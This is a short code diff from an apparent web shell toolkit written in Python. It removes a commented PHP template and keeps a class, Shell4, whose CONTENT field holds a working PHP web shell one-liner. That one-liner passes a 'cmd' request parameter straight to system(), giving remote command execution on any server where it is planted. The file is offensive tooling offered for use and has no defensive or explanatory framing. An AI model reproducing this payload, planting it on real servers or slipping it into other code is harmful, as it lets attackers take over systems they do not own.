@@ -1,8 +1,5 @@
 from webshell.shellbase import  SystemShellBase
 from lib import request
-'''
-<?php system($_{method}[{password}]);
-'''
 
 class Shell4(SystemShellBase):
     CONTENT = '''<?php system($_GET['cmd']);?>'''
